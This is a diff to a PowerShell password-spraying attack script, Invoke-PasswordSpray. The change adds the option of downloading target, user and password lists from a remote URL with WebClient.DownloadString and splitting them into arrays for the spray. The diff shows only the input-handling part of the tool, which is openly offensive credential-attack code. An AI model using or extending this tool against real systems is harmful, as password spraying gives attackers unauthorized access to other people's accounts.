@@ -2,11 +2,11 @@
   .SYNOPSIS
     Execute a password spraying attack.
   .PARAMETER Targets
-    Specify one target, a targets file, or a comma delimited list of targets.
+    Specify a target, comma delimited targets, a local targets file, or an online comma delimited targets string.
   .PARAMETER Users
-    Specify one user, a users file, or a comma delimited list of users.
+    Specify a user, comma delimited users, a local users file, or an online comma delimited users string.
   .PARAMETER Passwords
-    Specify one password, a password file, a comma delimited list of passwords.
+    Specify a password, comma delimited passwords, a local passwords file, or an online comma delimited passwords string.
   .NOTES
     Author: Luke Baggett
     Date: August 6, 2014
@@ -25,6 +25,10 @@ function Invoke-PasswordSpray
     if((Test-Path (Get-Variable -Name $Parameter -ValueOnly)) -eq $True)
     {
       Set-Variable -Name $Parameter -Value (Get-Content (Get-Variable -Name $Parameter -ValueOnly))
+    }
+    elseif((Get-Variable -Name $Parameter -ValueOnly).Contains("http://") -or (Get-Variable -Name $Parameter -ValueOnly).Contains("https://"))
+    {
+      Set-Variable -Name $Parameter -Value ((New-Object System.Net.WebClient).DownloadString((Get-Variable -Name $Parameter -ValueOnly)).Split(","))
     }
   }
 
